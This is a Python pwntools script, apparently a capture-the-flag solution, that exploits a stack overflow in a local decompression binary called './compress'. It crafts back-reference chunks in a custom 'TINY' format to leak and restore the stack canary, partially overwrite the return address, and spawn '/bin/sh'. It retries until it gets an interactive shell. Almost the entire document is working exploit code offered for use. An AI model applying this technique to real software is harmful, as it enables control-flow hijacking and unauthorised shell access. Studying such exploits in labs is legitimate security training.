from pwn import *

HEADER = b'TINY'
FOOTER = b'\xff\0\0'

def number_decode(b):
    l = 0
    n = 0
    for i, c in enumerate(b):
        l += 1
        has_next = (c & 0x80) == 0x80
        n += (c & 0x7f) * 128 ** i
        if not has_next:
            return n, l

assert number_decode(b'\x8a\x02') == (266, 2)

def number_encode(n):
    r = bytearray()
    while n > 0:
        c = n % 128
        n = n // 128
        if n > 0:
            c |= 0x80
        r.append(c)
    return r

assert number_encode(266) == b'\x8a\x02'

def chunk(lookback, length):
    lookback = -lookback
    if lookback < 0:
        lookback += 2**64
    return b'\xff' + number_encode(lookback) + number_encode(length)

def my_decompress(b):
    r = b''
    offset = 4
    while offset < len(b):
        c = b[offset]
        if c == 0xff:
            offset += 1
            (lookback, l) = number_decode(b[offset:])
            offset += l
            (chunk_len, l) = number_decode(b[offset:])
            offset += l
            for _ in range(chunk_len):
                x = r[-lookback]
                r += bytes([x])
        else:
            r += bytes([c])
            offset += 1
    return r

def decompress(buf):
    p = process('./compress')
    p.recvuntil(b'\n\n')
    p.sendline(b'2')
    p.recvuntil(b'Send me the hex-encoded string (max 4k):\n')
    p.sendline(buf.hex())
    p.recvline()
    line = p.recvline()
    p.recvall()
    r = bytes.fromhex(line[:-1].decode())
    return r

def do_decompression_tests():
    test_buffers = [
        bytes.fromhex('54494e5930ff01043132ff0104ff0b05ff055f31ff0109ff0000'),
        bytes.fromhex('54494e5930ff01043132ff0104ff0964ff080aff0000')
        ]

    for b in test_buffers:
        assert decompress(b) == my_decompress(b)

do_decompression_tests()

def exploit():
    buf = HEADER
    offset = 0
    
    canary_offset = offset
    lookback = 0x1008 - offset
    buf += chunk(lookback, 8)
    offset += 8

    binsh_offset = offset
    command = b'/bin/sh\0'
    buf += command
    offset += len(command)

    ret_offset = offset
    buf += b'\x39\x13'
    offset += 2

    A_offset = offset
    buf += b'A' * 8
    offset += 8

    length = 0x1008 - offset
    lookback = A_offset - offset
    buf += chunk(lookback, length)
    offset += length

    # Canary overwrite
    lookback = canary_offset - offset
    buf += chunk(lookback, 8)
    offset += 8

    # Some padding
    lookback = A_offset - offset
    buf += chunk(lookback, 0x28)
    offset += 0x28

    # Overwrite return address
    lookback = ret_offset - offset
    buf += chunk(lookback, 2)
    offset += 2
    lookback = 0x1048 - offset + 2
    buf += chunk(lookback, 6)
    offset += 6

    # Padding until command
    lookback = A_offset - offset
    buf += chunk(lookback, 0x10)
    offset += 0x10

    # /bin/sh 
    lookback = binsh_offset - offset
    buf += chunk(lookback, len(command))
    offset += len(command)

    buf += FOOTER

    while True:
        p = process('./compress')
        p.recvuntil(b'\n\n')
        p.sendline(b'2')
        p.recvuntil(b'Send me the hex-encoded string (max 4k):\n')
        p.sendline(buf.hex().encode())
        p.recvline()
        line = p.recvline()
        r = bytes.fromhex(line[:-1].decode())
        p.sendline(b'id')
        try:
            p.recvline()
        except EOFError:
            p.kill()
            continue  # Try again
        p.interactive()
        return

exploit()
